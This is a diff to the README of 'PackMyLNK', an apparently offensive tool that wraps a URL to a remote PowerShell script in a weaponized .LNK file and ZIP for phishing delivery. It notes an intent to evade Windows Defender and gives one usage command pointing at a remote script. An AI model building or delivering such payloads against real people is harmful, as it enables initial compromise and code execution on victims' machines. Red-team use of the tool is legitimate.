@@ -1,6 +1,8 @@
 # PackMyLNK
 
-This tool takes a URL as input and embeds it into a classic kill chain using .LNK files. I designed it with the specific intent of avoiding detection by Windows Defender. It generates a final ZIP file, ready to be delivered to the target using Social Engineering techniques.
+This tool takes a URL pointing to a PowerShell script and embeds it into a weaponized .LNK file for in-memory execution. It automatically generates the .LNK file, packages it in a ZIP, and prepares everything for easy delivery through Social Engineering techniques.
+
+Surprisingly, .LNK files remain effective today as an initial compromise vector in phishing and Red Team engagements!
 
 ## Usage
 `.\PackMyLNK.exe -Url http://example.com/RunMe.ps1`
